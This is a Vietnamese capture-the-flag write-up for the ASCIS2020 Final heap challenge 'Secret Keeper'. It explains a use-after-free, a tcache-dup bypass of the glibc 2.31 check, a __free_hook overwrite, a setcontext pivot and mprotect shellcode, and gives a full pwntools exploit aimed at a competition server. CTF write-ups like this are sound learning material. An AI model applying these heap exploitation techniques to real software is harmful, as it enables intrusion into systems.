---
# Documentation: https://wowchemy.com/docs/managing-content/

title: "[ASCIS2020 Final] Secret Keeper"
subtitle: ""
summary: "Short writeup for a pwn challenge in ASCIS2020 Final"
authors: [pickaxe]
tags: []
categories: []
date: 2020-12-03T21:27:00+07:00
lastmod: 2020-12-03T21:27:00+07:00
featured: false
draft: false

# Featured image
# To use, add an image named `featured.jpg/png` to your page's folder.
# Focal points: Smart, Center, TopLeft, Top, TopRight, Left, Right, BottomLeft, Bottom, BottomRight.
image:
  caption: ""
  focal_point: ""
  preview_only: false

# Projects (optional).
#   Associate this post with one or more of your projects.
#   Simply enter your project's folder or file name without extension.
#   E.g. `projects = ["internal-project"]` references `content/project/deep-learning/index.md`.
#   Otherwise, set `projects = []`.
projects: []
---

### Tổng quan
Đây là một heap challenge, với seccomp chỉ cho phép các syscall open, read, write, mprotect, ... không cho phép các syscall exec*
```
0000: 0x20 0x00 0x00 0x00000004  A = arch
0001: 0x15 0x00 0x0c 0xc000003e  if (A != ARCH_X86_64) goto 0014
0002: 0x20 0x00 0x00 0x00000000  A = sys_number
0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
0004: 0x15 0x00 0x09 0xffffffff  if (A != 0xffffffff) goto 0014
0005: 0x15 0x07 0x00 0x00000000  if (A == read) goto 0013
0006: 0x15 0x06 0x00 0x00000001  if (A == write) goto 0013
0007: 0x15 0x05 0x00 0x00000002  if (A == open) goto 0013
0008: 0x15 0x04 0x00 0x00000003  if (A == close) goto 0013
0009: 0x15 0x03 0x00 0x0000000a  if (A == mprotect) goto 0013
0010: 0x15 0x02 0x00 0x0000000e  if (A == rt_sigprocmask) goto 0013
0011: 0x15 0x01 0x00 0x00000027  if (A == getpid) goto 0013
0012: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0014
0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW
0014: 0x06 0x00 0x00 0x00000000  return KILL
```

Ban đầu, thực sự là mình khá ngại làm câu này, @midas hỗ trợ mình trong việc RE câu này. Trong lúc thi thì mình phát hiện ra lỗi Use-after-free ở tính năng encode và decode của chương trình
```c
(secret_to_encode->encoder)(secret_to_encode->buf, *&secret_to_encode->size, &dest_buf, &dest_size);
printf("Encode data: %s\n", dest_buf);
// dest_buf trỏ tới cùng buffer với secret_to_encode->buf
free(secret_to_encode->buf);
secret_to_encode->buf = dest_buf;
```

### Khai thác
Dùng lỗi ở trên, mình có thể dễ dàng leak được địa chỉ của heap và libc
```python
create_secret("AAAA\n", 0x10, "BBBBB\n")
encode_secret(1)
list_secret(1)
r.recvuntil("Your secret:\n")
heap = r.recvuntil("00 00").replace(" ", "")
heap = u64(heap.decode('hex')) - 0x2670
log.info("heap: %s" % hex(heap))

create_secret("AAAA\n", 0x600, "BBBBB\n", True)
create_secret("AAAA\n", 0x600, "BBBBB\n", True)
encode_secret(2)
list_secret(2)
r.recvuntil("Your secret:\n")
base_libc = r.recvuntil("00 00").replace(" ", "")
base_libc = u64(base_libc.decode('hex')) - 0x1ebbe0
```
Do không hiểu rõ tính năng edit nên mình quyết định sử dùng lỗi UAF này để gây ra tcache dup. Libc 2.31 có kiểm tra tcache dup thông qua `key` trong tcache chunk, tuy nhiên do tính năng encode thay đổi toàn bộ buffer nên overwrite luôn cả `key` nên mình có thể bypass cái check đó. Dùng tcache dup mình có thể overwrite `free_hook` từ đó kiểm soát được `rip`.
Tới đây, mình sử dụng gadget này trong libc
```
gadget = libc + 0x154930
mov     rdx, [rdi+8]
mov     [rsp], rax
call    qword ptr [rdx+0x20]
```
Do overwrite `free_hook` nên mình có thể kiểm soát `rdi` (tham số thứ nhất của hàm free), từ đó mình kiểm soát được `rdx` và tiếp tục kiểm soát được `rip`. Trỏ `rip` tới gadget trong `setcontext`
```
base_libc + 0x580DD
mov     rsp, [rdx+0A0h]
mov     rbx, [rdx+80h]
mov     rbp, [rdx+78h]
mov     r12, [rdx+48h]
mov     r13, [rdx+50h]
mov     r14, [rdx+58h]
mov     r15, [rdx+60h]
test    dword ptr fs:48h, 2
jz      loc_581C6

loc_581C6:
mov     rcx, [rdx+0A8h]
push    rcx
mov     rsi, [rdx+70h]
mov     rdi, [rdx+68h]
mov     rcx, [rdx+98h]
mov     r8, [rdx+28h]
mov     r9, [rdx+30h]
mov     rdx, [rdx+88h]
xor     eax, eax
retn
```
Tới đây, do kiểm soát `rdx` nên mình có thể kiểm soát rất nhiều thanh ghi khác trong đó có cả `rsp` rất thuận tiện cho việc ROP. Gọi `mprotect` để giúp heap có thêm quyền execute sau đó nhảy tới shellcode open read write để đặt trên heap là mình có được flag.

Full exploit
```python
from pwn import *

def create_secret(name, size, payload, reuse=False):
    r.sendlineafter(">> ", "1")
    if reuse:
        r.sendline("0")
    r.sendafter("Name: ", name)
    r.sendlineafter("size:", str(size))
    r.send(payload)
    r.sendlineafter("3. None\n", "1")

def encode_secret(index):
    r.sendlineafter(">> ", "5")
    r.sendlineafter(">> ", str(index))

def list_secret(index):
    r.sendlineafter(">> ", "3")
    r.sendlineafter(">> ", str(index))

def delete_secret(index):
        r.sendlineafter(">> ", "4")
        r.sendlineafter(">> ", str(index))

if (sys.argv[1] == "local"):
    r = process("./secret_keeper")
else:
    r = remote("35.240.209.133", 1337)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
free_hook_off = libc.symbols["__free_hook"]
mprotect_off = libc.symbols["mprotect"]

create_secret("AAAA\n", 0x10, "BBBBB\n")
encode_secret(1)
list_secret(1)
r.recvuntil("Your secret:\n")
heap = r.recvuntil("00 00").replace(" ", "")
#print heap
heap = u64(heap.decode('hex')) - 0x2670
log.info("heap: %s" % hex(heap))

#pause()
create_secret("AAAA\n", 0x600, "BBBBB\n", True)
create_secret("AAAA\n", 0x600, "BBBBB\n", True)
encode_secret(2)
list_secret(2)

r.recvuntil("Your secret:\n")
base_libc = r.recvuntil("00 00").replace(" ", "")
base_libc = u64(base_libc.decode('hex')) - 0x1ebbe0
log.info("base_libc: %s" % hex(base_libc))
free_hook = base_libc + free_hook_off
log.info("free_hook: %s" % hex(free_hook))
mprotect = base_libc + mprotect_off

create_secret("TTTT\n", 0x100, "BBBBB\n", True)
create_secret("TTTT\n", 0x100, "BBBBB\n", True)
encode_secret(4)
encode_secret(5)

create_secret("AAAA\n", 0x100, "BBBBB\n", True)

encode_secret(6)
encode_secret(6)

gadget = base_libc + 0x154930
setcontext = base_libc + 0x580DD

create_secret("CCCC\n", 0x100, p64(free_hook) + "\n", True)
payload = "A"*8 + p64(heap+0x1fb0) + "B"*0x10 + p64(setcontext)

payload += "A"*0x40 + p64(heap-0x40) + p64(0xf000)
payload += "A"*0x10 + p64(7) + "A"*0x10 + p64(heap+0x3150) + p64(mprotect)

create_secret("DDDD\n", 0x100, payload + "\n", True)
create_secret("CCCC\n", 0x100, p64(gadget) + "\n", True)

context.arch = "amd64"
shellcode = shellcraft.open("/opt/flag/flag.txt", 0, 0)
shellcode += shellcraft.read("rax", "rsp", 100)
shellcode += shellcraft.write(1, "rsp", 100)
shellcode = asm(shellcode)

payload = p64(heap + 0x3150 + 0x8) + shellcode
create_secret("MMMM\n", 0x100, payload + "\n", True)

#pause()
delete_secret(8)

r.interactive()

```

Mình thực sự rất vui vì đã giải được câu này trong thời gian cuộc thi.

Cảm ơn anh @Peter vì những heap challenge rất hay, cảm ơn BTC vì một kỳ thi thú vị.

Cảm ơn anh @Biên, writeup của anh về bài ở vòng loại đã giúp em rất nhiều trong quá trình làm bài này.
